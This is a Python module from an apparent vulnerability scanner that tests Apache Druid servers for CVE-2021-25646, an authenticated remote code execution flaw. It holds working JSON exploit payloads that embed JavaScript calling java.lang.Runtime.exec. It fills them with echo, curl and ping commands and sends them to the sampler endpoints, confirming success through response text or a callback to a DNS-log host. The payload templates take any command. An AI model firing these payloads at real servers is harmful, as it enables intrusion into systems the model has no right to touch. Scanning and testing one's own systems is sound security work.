#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from lib.tool import check
from time import sleep

# * 有回显/无回显 Payload
cve_2021_25646_data = '''{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema": {"dataSource": "%%DATASOURCE%%","parser": {"parseSpec": {"format": "javascript","timestampSpec": {},"dimensionsSpec": {},"function": "function(){var s = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\"COMMAND\\").getInputStream()).useDelimiter(\\"\\\\A\\").next();return {timestamp:\\"2013-09-01T12:41:27Z\\",test: s}}","": {"enabled": "true"}}}}},"samplerConfig": {"numRows": 10}}'''
cve_2021_25646_no_data = '''{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript","function":"function(value){return java.lang.Runtime.getRuntime().exec('COMMAND')}","dimension":"added","":{"enabled":"true"}}}}},"samplerConfig":{"numRows":5,"cacheKey":"79a5be988bf94d42a6f219b63ff27383"}}'''

random_str = random_md5(6)  # * 随机6位字符串

cve_2021_25646_payloads = [
    # ! 回显POC
    {
        'path': 'druid/indexer/v1/sampler?for=filter',
        'data': cve_2021_25646_data.replace('COMMAND', 'echo ' + random_str)
    },
    {
        'path': 'indexer/v1/sampler?for=filter',
        'data': cve_2021_25646_data.replace('COMMAND', 'echo ' + random_str)
    },
    # ! 无回显POC
    {
        'path': 'druid/indexer/v1/sampler?for=filter',
        'data': cve_2021_25646_no_data.replace('COMMAND', 'curl DNSDOMAIN')
    },
    {
        'path': 'druid/indexer/v1/sampler?for=filter',
        'data': cve_2021_25646_no_data.replace('COMMAND', 'curl http://DNSDOMAIN')
    },
    {
        'path': 'druid/indexer/v1/sampler?for=filter',
        'data': cve_2021_25646_no_data.replace('COMMAND', 'ping -c 4 DNSDOMAIN')
    },
    {
        'path': 'druid/indexer/v1/sampler?for=filter',
        'data': cve_2021_25646_no_data.replace('COMMAND', 'ping DNSDOMAIN')
    },
]

def cve_2021_25646_scan(self, clients):
    ''' Apache Druid 包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码, 
        此功能在用于高信任度环境中, 默认已被禁用
            但是, 在 Druid 0.20.0及更低版本中, 
            经过身份验证的用户可以构造传入的json串来控制一些敏感的参数发送恶意请求, 
            利用 Apache Druid 漏洞可以执行任意代码
    '''
    client = clients.get('reqClient')
    sessid = '244d164411e9b78ca7074ec47f2c4f96'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2021-25646',
    }
    
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': client.protocol_domain,
        'Origin': client.protocol_domain,
    }

    for payload in cve_2021_25646_payloads:
        dns_md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = dns_md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
        
        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                    # * dnslog可能较慢, 等一会
        if (check.check_res(res.text, random_str)
            or dns.result(dns_md, sessid)
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
